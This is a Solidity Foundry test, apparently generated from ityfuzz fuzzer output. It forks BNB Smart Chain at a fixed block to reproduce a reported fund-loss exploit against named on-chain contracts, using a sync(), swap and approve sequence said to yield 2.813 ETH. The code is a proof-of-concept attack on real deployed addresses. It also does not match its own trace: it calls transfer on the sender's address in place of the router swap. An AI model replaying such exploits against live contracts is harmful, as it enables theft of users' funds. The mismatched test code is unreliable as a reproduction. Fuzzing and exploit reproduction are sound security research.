// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x68Cc90351a79A4c10078FE021bE430b7a12aaA09,0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0x88503F48e437a377f1aC2892cBB3a5b09949faDd,0xc342774492b54ce5F8ac662113ED702Fc1b34972 -c bsc --onchain-block-number 22315679 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 2.813 ETH by interacting with the provided contracts

================ Trace ================
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   ├─[1] 0x88503F48e437a377f1aC2892cBB3a5b09949faDd.sync()
   └─[1] Router.swapExactETHForTokens{value: 9.2233 ether}(0, path:(WETH → 0xc342774492b54ce5F8ac662113ED702Fc1b34972), address(this), block.timestamp);
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   └─[1] 0xc342774492b54ce5F8ac662113ED702Fc1b34972.approve(0x68Cc90351a79A4c10078FE021bE430b7a12aaA09, 2387.6996 ether)


 */

contract C68Cc is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 22315679);
    }

    function test() public {
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        IERC20(0x88503F48e437a377f1aC2892cBB3a5b09949faDd).sync();
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        IERC20(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024).transfer(0xc342774492b54ce5F8ac662113ED702Fc1b34972, 9.2233 ether);
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0xc342774492b54ce5F8ac662113ED702Fc1b34972).approve(0x68Cc90351a79A4c10078FE021bE430b7a12aaA09, 2387.6996 ether);
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
